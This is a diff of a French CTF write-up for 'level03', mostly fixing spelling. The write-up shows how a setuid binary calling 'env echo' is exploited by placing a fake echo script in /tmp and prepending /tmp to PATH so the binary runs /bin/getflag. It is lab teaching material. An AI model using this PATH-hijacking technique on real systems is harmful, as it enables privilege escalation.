@@ -1,7 +1,7 @@
 # Rapport CTF - [level03]
 
 ### Observation:
-En arrivant sur le level on trouve un exécutable nommer `level03` qui a été créer par flag03: `ls -la`
+En arrivant sur le niveau on trouve un exécutable nommé `level03` qui a été créé par flag03: `ls -la`
 
 ### Code:
 Nous allons donc décompiler le code pour pouvoir le comprendre.
@@ -22,18 +22,22 @@ setresuid(v5, v5, v5);
 return system("/usr/bin/env echo Exploit me");
 }
 ```
-On remarque que le `echo` est lancer depuis l'env.
+On remarque que le `echo` est lancé depuis l'env.
 
 
 
 ### Solution :
-Nous avons donc 2 solutions, soient changées la variable d'environnement echo, soit ajouter une variable d'environnement echo qui lance une commande, nous allons faire cette 2eme solution, car c'est plus simple à enlever.
-La première étape consiste a créer un fichier qui se nomme echo avec la commande a exécuter à l'intérieur:
+Nous avons donc 2 solutions:
+ 1. Changer la variable d'environnement echo
+ 2. Ajouter une variable d'environnement echo qui lance une commande
+
+Nous allons faire cette 2eme solution, car c'est la plus simple à enlever.
+La première étape consiste a créer un fichier qui se nomme echo avec la commande à exécuter à l'intérieur:
 `echo /bin/getflag > /tmp/echo`
-Nous devons aussi lui donner les droits d'être exécuter par un autre programme:
+Nous devons aussi lui donné les droits d'être exécuté par un autre programme:
 `chmod 777 /tmp/echo`
 
-Puis on ajoute notre fake echo dans les variables d'environnement:
+Puis on ajoute notre chemin d'accés à notre echo dans les variables d'environnement:
 `export PATH=/tmp:$PATH`
 
 On lance ensuite notre programme, `./level03`
